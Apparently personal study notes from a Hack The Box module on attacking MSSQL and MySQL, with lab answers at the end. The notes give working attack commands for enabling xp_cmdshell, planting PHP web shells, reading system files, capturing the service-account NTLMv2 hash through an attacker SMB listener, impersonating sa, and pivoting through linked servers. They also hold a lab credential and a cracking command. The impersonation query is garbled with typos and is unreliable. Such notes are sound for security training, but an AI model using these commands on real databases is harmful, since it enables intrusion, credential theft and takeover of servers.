$SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES  > GO
\\Select all Data from Table "users"
mysql>SELECT * FROM users; > GO
\\Execute commands
-Command execution lets attackers control the OS. With sufficient privileges SQL can run system commands. MSSQL’s xp_cmdshell does this — powerful and disabled by default (enable via Policy-Based Management or sp_configure), runs as the SQL Server service account, and is synchronous.
Example: EXEC xp_cmdshell 'whoami';
\\xp_cmdshell
1>xp_cmdshell 'whoami'  2>GO
-If xp_cmdshell is not enabled, we can enable it, if we have the appropriate privileges, using the following command:
$mssql>EXECUTE sp_configure 'show advanced options', 1 >GO
$RECONFIGURE >GO 
$EXECUTE sp_configure 'xp_cmdshell', 1 >GO
$RECONFIGURE  >GO

-Other ways to get command execution include extended stored procedures, CLR assemblies, SQL Server Agent jobs, external scripts, and registry tweaks like xp_regwrite (privilege escalation) — out of scope here.
MySQL UDFs can run C/C++ (a command-exec UDF exists on GitHub); rare in production but possible.

\\Write Local files
MySQL has no xp_cmdshell, but with sufficient privileges you can write an executable file (e.g. via SELECT ... INTO OUTFILE) into a webserver directory (PHP/ASP.NET) and then trigger it to run.
https://mariadb.com/docs/server/reference/sql-statements/data-manipulation/selecting-data/select-into-outfile
$mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
-In MySQL, a global system variable secure_file_priv limits the effect of data import and export operations, such as those performed by the LOAD DATA and SELECT … INTO OUTFILE statements and the LOAD_FILE() function. These operations are permitted only to users who have the FILE privilege.

secure_file_priv may be set as follows:

If empty, the variable has no effect, which is not a secure setting.
If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
If set to NULL, the server disables import and export operations.
\\MySQL- Secure File Privileges
mysql>show variables like "secure_file_priv";
-To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:
\\MSSQL - Enable Ole Automation Procedures
1>sp_configure 'show advanced options', 1 >GO
3>RECONFIGURE >GO
5>sp_configure 'Ole Automation Procedures', 1 >GO
7>RECONFIGURE >GO
\\MSSQL - Create a File
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
\\Read Local files
-By default, MSSQL allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:
Read Local Files in MSSQL
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents  > GO
-As we previously mentioned, by default a MySQL installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:
\\MySQL - Read Local Files in MySQL
mysql> select LOAD_FILE("/etc/passwd");
\\Capture MSSQL Service Hash
-ChatGPT said:

Point xp_subdirs/xp_dirtree at your SMB listener and MSSQL will authenticate to it, leaking the SQL Server service account’s NTLMv2 hash. Start an SMB responder (e.g., Responder or impacket-smbserver) and run the SQL query to trigger the authentication.
-To make this work, we need first to start Responder or impacket-smbserver and execute one of the following SQL queries:
\\XP_DIRTREE Hash Stealing
1>EXEC master..xp_dirtree '\\10.10.110.17\share\' 2>GO
\\XP_SUBDIRS Hash Stealing
1>EXEC master..xp_subdirs '\\10.10.110.17\share\' 2>GO
-If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.
\\XP_SUBDIRS Hash Stealing with Responder
$sudo responder -I tun0
\\XP_SUBDIRS Hash Stealing with impacket
$sudo impacket-smbserver share ./ -smb2support
\\Impersonate Existing Users with MSSQL
-SQL svr has a special perm name IMPERSONATE, that allow the exec user to take on the perm of another user or login until the context is reset or the session enumdomousers
-First, we need to identify users that we can impersonate. Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned. We can use the following query to identify users we can impersonate:
\\identify Users that we can impersonate
1>SELECT distinct b.name
2>FROM sys.server_permissions 0
3>INNER JOIN sys.server_pricipals b 
4>ON a.grator_pricipal_id = b.grator_pricipal_id
5>WHERE a.permission_name = 'IMPERSONATE'
6>GO
-To get an idea of privilege escalation possibilities, let's verify if our current user has the sysadmin role:
\\Verify our Current User and Role
1>SELECT SYSTEM_USER
2>SELECT IS_SRVROLEMEMBER('sysadmin') 3>GO
-Return code 0 = not sysadmin. Impersonate sa with:
EXECUTE AS LOGIN = 'sa';
then run the commands.
\\Impersonating the SA User
1>EXECUTE AS LOGIN = 'sa'
2>SELECT SYSTEM_USER
3>SELECT IS_SRVROLEMEMBER('sysadmin') >GO
-Note: It's recommended to run EXECUTE AS LOGIN within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using USE master.
-We can now execute any command as a sysadmin as the returned value 1 indicates. To revert the operation and return to our previous user, we can use the Transact-SQL statement REVERT.
-Note: If we find a user who is not sysadmin, we can still check if the user has access to other databases or linked servers.
\\Communicate with Other Databases with MSSQL
-MSSQL linked servers let one DB query another (SQL Server or other DB). If a linked server uses remote credentials with sysadmin rights, you can pivot and run queries/commands on the remote instance — find and test linked servers.
-MSSQL has a configuration option called linked servers. Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.
\\identify linked Servers in MSSQL
1>SELECT srvname, isremote FROM sysservers >GO
-https://learn.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql?view=sql-server-ver17
-Next, we can attempt to identify the user used for the connection and its privileges. The EXECUTE statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets ([ ]).
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO
-Note: If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).

<test>What is the password for the "mssqlsvc" user?
$sudo apt install sqlcmd
htbduser:MSSQLAccess01!:
$sql -S <ip> -U htbdbuser
-In another terminal tab on Pwnbox/PMVPN, students need to start an SMB share with impacket-smbserver and utilize the flag -smb2support:
$sudo impacket-smbserver share ./ -smb2support
Afterward, using the terminal tab with the sqlcmd connection, students need to steal the MSSQL service account hash using either xp_subdirs or xp_dirtree, the latter will be used:
EXEC master..xp_dirtree '\\pwnIp\share' >GO
Students will receive the NetNTLMv2 hash of mssqlsvc on the terminal tab with impacket-smbserver running:
$echo "mssqlsvc::WIN-02:aaaaaaaaaaaaaaaa:da87f7aa577b48e8361cf1b021e6bfca:010100000000000000555ef6718cd801e1b423320a45d0570000000001001000760055004a005100610058005200550003001000760055004a00510061005800520055000200100069004700430077004f0055006b0077000400100069004700430077004f0055006b0077000700080000555ef6718cd80106000400020000000800300030000000000000000000000000300000f4316f662256a822989f5d2574efb5b4cbf92c2ce43cb82538c6b2b358a130650a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0034000000000000000000" > hash.txt
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

<test>Enumerate the "flagDB" database and submit a flag as your answer.
$sqlcmd -S <ip> -U .\\mssqlsvc
sql>use flagDB >GO > SELECT table_name FROM flagDB.INFORMATION_SCHEMA.TABLES >GO
$SELECT * FROM tb_flag > GO
